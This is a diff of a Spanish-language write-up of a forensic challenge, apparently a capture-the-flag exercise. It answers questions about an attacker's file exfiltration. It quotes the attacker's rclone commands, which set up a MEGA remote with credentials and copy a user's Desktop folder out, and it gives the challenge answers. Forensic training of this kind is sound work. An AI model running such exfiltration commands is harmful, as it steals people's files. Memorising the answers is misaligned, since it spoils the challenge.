@@ -127,7 +127,7 @@ Si observamos los detalles encontrados por la herramienta `Chainsaw`, podemos ve
 ```
 rclone.exe config create remote mega user majmeret@protonmail.com pass FBMeavdiaFZbWzpMqIVhJCGXZ5XXZI1sU3EjhoKQw0rEoQqHyI
 ```
-- `Respuesta: majmeret@protonmail.com`
+`Respuesta: majmeret@protonmail.com`
 
 2. ¿Cuál es la contraseña del atacante utilizada para el proceso de exfiltración?
 En el comando anterior, también se puede observar esta respuesta:
@@ -149,7 +149,7 @@ Para responder a esta pregunta, debemos examinar el detalle de la segunda detecc
 ```
 "C:\Users\wade\AppData\Local\Temp\rclone-v1.61.1-windows-amd64\rclone.exe" copy C:\Users\Wade\Desktop\Relic_location\ remote:exfiltration -v
 ```
-- `Respuesta: C:\Users\Wade\Desktop\Relic_location`
+`Respuesta: C:\Users\Wade\Desktop\Relic_location`
 
 
 6. ¿Cuál es el nombre de la carpeta a la que el atacante extrajo los archivos?
